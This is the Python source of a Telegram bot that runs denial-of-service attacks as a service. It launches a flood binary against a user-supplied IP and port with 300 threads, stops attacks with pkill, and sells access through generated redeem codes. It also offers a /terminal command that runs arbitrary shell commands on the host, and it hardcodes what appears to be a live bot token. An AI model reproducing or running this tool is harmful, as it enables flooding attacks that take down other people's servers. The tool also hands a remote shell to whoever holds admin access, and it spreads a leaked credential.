import os
import subprocess
import json
import random
import string
import time
import ipaddress
from threading import Thread
import asyncio

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

DATA_PATH = 'data'
ADMIN_IDS = ["5486683891"]
ADMIN_NAME = "@Gx7_Admin"

SETTINGS = {
    'threads': 300,
    'time': 60
}

START_TIME = time.time()

os.makedirs(DATA_PATH, exist_ok=True)


def load_json(file):
    try:
        with open(f"{DATA_PATH}/{file}.json", "r") as f:
            return json.load(f)
    except:
        return {}


def save_json(file, data):
    with open(f"{DATA_PATH}/{file}.json", "w") as f:
        json.dump(data, f)


def is_admin(user_id):
    return str(user_id) in ADMIN_IDS


def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if is_admin(update.effective_user.id):
            return await func(update, context)
        else:
            await update.message.reply_text(f"❌ You are not authorized to use this command. Contact admin: {ADMIN_NAME}")
    return wrapper


def get_uptime():
    uptime = int(time.time() - START_TIME)
    hrs, rem = divmod(uptime, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs}h {mins}m {secs}s"


async def attack_completed(bot, user_id, target, port, duration):
    await bot.send_message(chat_id=user_id, text=f"✅ <b>Attack Completed</b>\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏱️ Duration: {duration} seconds\n⚡ Status: Success\n👑 Requested by: {ADMIN_NAME}", parse_mode=ParseMode.HTML)


def execute_attack(bot, user_id, target, port, duration):
    try:
        full_command = f"./flash {target} {port} {duration} {SETTINGS['threads']}"
        subprocess.run(full_command, shell=True)
        asyncio.run(attack_completed(bot, user_id, target, port, duration))
    except Exception as e:
        asyncio.run(bot.send_message(chat_id=user_id, text=f"❌ Attack failed: {e}"))


@admin_only
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("pkill -f golem", shell=True)
        await update.message.reply_text(f"⛔ All attacks have been stopped!\n👑 Command by: {ADMIN_NAME}")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Failed to stop attacks: {e}")


@admin_only
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = args

    try:
        ipaddress.ip_address(ip)
    except ValueError:
        await update.message.reply_text("❌ Invalid IP address.")
        return

    if not port.isdigit() or not duration.isdigit():
        await update.message.reply_text("❌ Port and time must be numeric.")
        return

    await update.message.reply_text(
        f"⚔️ <b>Attack launched!</b>\n\n🎯 Target: {ip}\n🔌 Port: {port}\n⏱️ Duration: {duration}s\n👑 Requested by: {ADMIN_NAME}",
        parse_mode=ParseMode.HTML
    )
    Thread(target=execute_attack, args=(context.bot, user_id, ip, port, duration)).start()


def generate_code():
    return f"TEJAS-{code_block()}-{code_block()}-{code_block()}"


def code_block():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))


@admin_only
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    codes = load_json("codes")
    code = generate_code()
    codes[code] = False
    save_json("codes", codes)
    await update.message.reply_text(f"🎁 <b>Generated Redeem Code:</b> <code>{code}</code>\n👑 Generated by: {ADMIN_NAME}", parse_mode=ParseMode.HTML)


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    codes = load_json("codes")
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <code>")
        return

    code = args[0].upper()
    if codes.get(code) is False:
        codes[code] = True
        users = load_json("users")
        users[user_id] = True
        save_json("users", users)
        save_json("codes", codes)
        await update.message.reply_text("✅ Access granted successfully!")
    else:
        await update.message.reply_text("❌ Invalid or already used code.")


@admin_only
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /approve <user_id>")
        return

    users = load_json("users")
    users[args[0]] = True
    save_json("users", users)
    await update.message.reply_text(f"✅ Approved user {args[0]}\n👑 Approved by: {ADMIN_NAME}")


@admin_only
async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_json("users")
    text = "\n".join([f"- {uid}" for uid in users]) or "No users approved."
    await update.message.reply_text(f"👥 <b>Approved Users:</b>\n{text}", parse_mode=ParseMode.HTML)


@admin_only
async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    codes = load_json("codes")
    text = "\n".join([f"{code} - {'✅' if used else '❌'}" for code, used in codes.items()]) or "No codes generated."
    await update.message.reply_text(f"🔑 <b>Redeem Codes:</b>\n{text}", parse_mode=ParseMode.HTML)


@admin_only
async def setthreads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /threads <number>")
        return
    SETTINGS['threads'] = int(args[0])
    await update.message.reply_text(f"🧵 Threads set to {args[0]}\n👑 Set by: {ADMIN_NAME}")


@admin_only
async def settime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /time <seconds>")
        return
    SETTINGS['time'] = int(args[0])
    await update.message.reply_text(f"⏱️ Default attack time set to {args[0]}s\n👑 Set by: {ADMIN_NAME}")


@admin_only
async def terminal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /terminal <command>")
        return
    try:
        result = subprocess.check_output(" ".join(args), shell=True).decode()
    except Exception as e:
        result = str(e)
    await update.message.reply_text(f"<code>{result}</code>\n👑 Executed by: {ADMIN_NAME}", parse_mode=ParseMode.HTML)


async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"⏳ Bot uptime: {get_uptime()}")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        greet = f"👑 Welcome Admin {ADMIN_NAME}! Use the buttons or type /help to see commands."
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📖 Help", callback_data='help')],
            [InlineKeyboardButton("⚔️ Attack", callback_data='attack')],
            [InlineKeyboardButton("🧵 Threads", callback_data='threads')],
            [InlineKeyboardButton("💻 Terminal", callback_data='terminal')],
            [InlineKeyboardButton("⛔ Stop", callback_data='stop')]
        ])
    else:
        greet = "🙋‍♂️ Hello User! Use /redeem <code> to gain access or type /help."
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📖 Help", callback_data='help')]
        ])
    await update.message.reply_text(greet, reply_markup=keyboard)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🌟 <b>Available Commands for All Users:</b>\n"
        f"💠 /redeem <code> - Redeem access code\n"
        f"ℹ️ /help - Show this help message\n"
        f"⏳ /uptime - Show bot uptime\n"
        f"\n"
        f"👑 <b>Admin Commands (by {ADMIN_NAME}):</b>\n"
        f"⚔️ /attack <ip> <port> <time> - Start an attack\n"
        f"⛔ /stop - Stop all attacks\n"
        f"🎁 /gen - Generate a redeem code\n"
        f"✅ /approve <user_id> - Approve a user\n"
        f"👥 /users - List approved users\n"
        f"🔑 /listcodes - List all redeem codes\n"
        f"🧵 /threads <number> - Set thread count\n"
        f"⏱️ /time <seconds> - Set default attack time\n"
        f"💻 /terminal <cmd> - Execute terminal command",
        parse_mode=ParseMode.HTML
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    command = query.data

    if command == 'help':
        await help_command(update, context)
    elif command == 'attack':
        await query.edit_message_text("Use /attack <ip> <port> <time> to start an attack.")
    elif command == 'threads':
        await query.edit_message_text("Use /threads <number> to set threads.")
    elif command == 'terminal':
        await query.edit_message_text("Use /terminal <command> to execute shell commands.")
    elif command == 'stop':
        await stop(update, context)


if __name__ == '__main__':
    TOKEN = os.getenv("7205334293:AAHqXJEtK9kPh8PCkwh7RTKV3zSseSj84_I") or "YOUR_BOT_TOKEN_HERE"
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("users", users_list))
    app.add_handler(CommandHandler("listcodes", listcodes))
    app.add_handler(CommandHandler("threads", setthreads))
    app.add_handler(CommandHandler("time", settime))
    app.add_handler(CommandHandler("terminal", terminal))
    app.add_handler(CommandHandler("uptime", uptime))
    app.add_handler(CallbackQueryHandler(button_handler))

    app.run_polling()
